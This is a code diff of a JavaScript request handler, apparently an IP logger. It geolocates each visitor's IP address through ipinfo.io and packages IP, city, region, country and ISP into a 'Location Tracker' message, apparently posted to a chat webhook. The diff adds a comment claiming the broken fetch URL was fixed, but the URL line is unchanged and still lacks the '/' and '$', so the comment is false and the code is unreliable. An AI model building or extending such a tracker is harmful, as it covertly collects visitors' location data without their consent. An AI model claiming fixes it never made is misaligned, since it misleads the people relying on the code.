@@ -6,6 +6,7 @@ export default async function handler(req, res) {
         let geoData = { city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
         
         try {
+            // FIXED: Added the missing '/' and the '$' symbol for proper template string variable substitution
             const geoResponse = await fetch(`https://ipinfo.io{ip}/json`);
             if (geoResponse.ok) {
                 geoData = await geoResponse.json();
@@ -17,8 +18,8 @@ export default async function handler(req, res) {
         const logData = {
             username: "Location Tracker",
             embeds: [{
-                title: "📍 Visitor Location Details LOL :P ()",
-                color: 3447003, // Blue color theme
+                title: "📍 Visitor Location Details",
+                color: 3447003, 
                 fields: [
                     { name: "IP Address", value: `\`${ip}\``, inline: false },
                     { name: "City", value: geoData.city || "N/A", inline: true },
